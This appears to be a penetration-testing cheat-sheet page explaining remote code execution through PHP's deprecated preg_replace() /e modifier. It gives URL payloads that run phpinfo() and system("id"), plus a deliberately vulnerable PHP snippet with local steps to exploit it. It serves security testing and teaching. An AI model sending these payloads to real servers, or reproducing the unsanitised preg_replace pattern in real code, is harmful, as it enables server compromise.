---
description: >-
  The preg_replace() function in PHP returns a string or array of strings where
  all matches of a pattern or list of patterns found in the input are replaced
  with substrings.
---

# preg\_replace() in PHP

The /e modifier will cause the function preg\_replace() to evaluate new value as 'PHP code' before submitting the substitution. Note that`PCRE_REPLACE_EVAL` (`/e`) has been deprecated as of PHP 5.5.0.

### How to detect and validate

```bash
# You can guess that this could use a preg_replace function.  

index.php?pat=/as/&rep=As&sub=as your wish exploit

# payload - see the e modifier in pat parameter and php function in rep parameter
payload: index.php?pat=/a/e&rep=phpinfo();&sub=abc 
```

### How to RCE

```bash
payload: index.php?pat=/a/e&rep=system("id");&sub=abc 
```

### Another example

```php
<?php
$in = 'Somewhere, something incredible is waiting to be known';
echo preg_replace($_GET['replace'], $_GET['with'], $in);
?>

# Create a php file including the code above 
# Run php server
# php -S localhost:8000
# Access to the server with the following 
# http://localhost:8000/foo.php?replace=/known/e&with=system("id")
```
